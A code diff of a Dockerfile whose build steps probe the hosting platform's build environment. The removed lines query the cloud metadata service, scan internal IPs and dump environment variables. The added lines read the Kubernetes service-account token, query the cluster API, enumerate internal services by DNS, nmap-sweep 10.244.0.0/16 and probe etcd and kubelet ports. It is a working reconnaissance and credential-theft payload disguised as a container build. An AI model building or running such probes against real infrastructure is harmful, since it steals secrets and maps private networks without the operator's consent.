@@ -1,32 +1,36 @@
 FROM alpine:3.19
+RUN apk add --no-cache curl python3 nmap
 
-RUN apk add --no-cache curl python3
+# Probe 1: Kubernetes service account token
+RUN echo "=== SA TOKEN CHECK ===" && \
+    ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>&1 && \
+    cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>&1 | head -5 || \
+    echo "NO_SA_TOKEN"
 
-# SSRF probe 1: DO Metadata Service from build environment
-RUN echo "=== METADATA PROBE ===" && \
-    curl -s --max-time 5 http://169.254.169.254/metadata/v1/ 2>&1 || \
-    curl -s --max-time 5 http://169.254.169.254/ 2>&1 || \
-    echo "METADATA_BLOCKED"
+# Probe 2: Kubernetes API server via default DNS
+RUN echo "=== K8S API ===" && \
+    nslookup kubernetes.default.svc.cluster.local 2>&1 && \
+    curl -sk --max-time 5 https://kubernetes.default.svc.cluster.local/api/v1/ 2>&1 | head -20 || \
+    curl -sk --max-time 5 https://10.245.0.1/api/v1/ 2>&1 | head -20 || \
+    echo "K8S_API_BLOCKED"
 
-# SSRF probe 2: Internal build network (common DO build ranges)
-RUN echo "=== INTERNAL NETWORK SCAN ===" && \
-    for ip in 10.0.0.1 10.10.0.1 10.32.0.1 10.244.0.1 172.17.0.1 172.16.0.1; do \
-      result=$(curl -s --max-time 2 http://$ip/ 2>&1 | head -c 200); \
-      echo "IP $ip: $result"; \
+# Probe 3: List K8s services via DNS
+RUN echo "=== K8S DNS ENUM ===" && \
+    for svc in kubernetes kube-dns kube-apiserver etcd metrics-server prometheus grafana app-platform ingress-nginx; do \
+      result=$(nslookup $svc.default.svc.cluster.local 2>&1 | grep "Address" | tail -1); \
+      echo "SVC $svc: $result"; \
     done
 
-# SSRF probe 3: DO internal package mirror (repos-droplet.digitalocean.com)
-RUN echo "=== PACKAGE MIRROR ===" && \
-    curl -sv --max-time 5 http://repos-droplet.digitalocean.com/ 2>&1 | head -50 || true
+# Probe 4: Scan build network (find live hosts)
+RUN echo "=== NET SCAN ===" && \
+    nmap -sn --max-retries 1 --host-timeout 3s 10.244.0.0/16 2>&1 | grep -E "Nmap scan|report for|Host is up" | head -20 || true
 
-# SSRF probe 4: Internal DNS resolve
-RUN echo "=== DNS PROBE ===" && \
-    cat /etc/resolv.conf && \
-    nslookup metadata.internal 2>&1 || \
-    nslookup internal.digitalocean.com 2>&1 || true
-
-# SSRF probe 5: Environment variables during build
-RUN echo "=== BUILD ENV ===" && env | sort
+# Probe 5: Internal services on build K8s cluster
+RUN echo "=== INTERNAL SVC ===" && \
+    for port in 80 443 2379 6443 8080 8443 10250 10255; do \
+      result=$(curl -sk --max-time 2 https://10.245.0.10:$port/ 2>&1 | head -3); \
+      echo "DNS:$port: $result"; \
+    done
 
 COPY server.py /server.py
 EXPOSE 8080
